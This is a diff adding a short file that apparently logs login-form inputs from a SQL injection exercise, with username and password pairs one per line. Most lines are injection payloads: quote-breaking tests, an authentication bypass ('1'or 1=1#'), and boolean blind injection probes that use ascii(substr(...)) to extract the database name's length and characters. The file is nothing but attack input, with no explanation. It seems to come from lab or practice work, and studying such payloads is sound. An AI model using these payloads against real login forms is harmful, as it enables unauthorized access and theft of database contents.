@@ -1,0 +1,11 @@
+User Name:123Password:123
+User Name:Password:
+User Name:1Password:1'
+User Name:1'Password:1
+User Name:11'--+Password:1
+User Name:adminPassword:1'or 1=1#
+User Name:adminPassword:1' or ascii(substr((length(database())),1,1))>50
+User Name:adminPassword:1'or 1=1#
+User Name:adminPassword:1' or ascii(substr((length(database())),1,1))>50;--+
+User Name:adminPassword:1' or ascii(substr((length(database())),1,1))>50;#
+User Name:adminPassword:1' or ascii(substr((select database()),1,1))>100;#
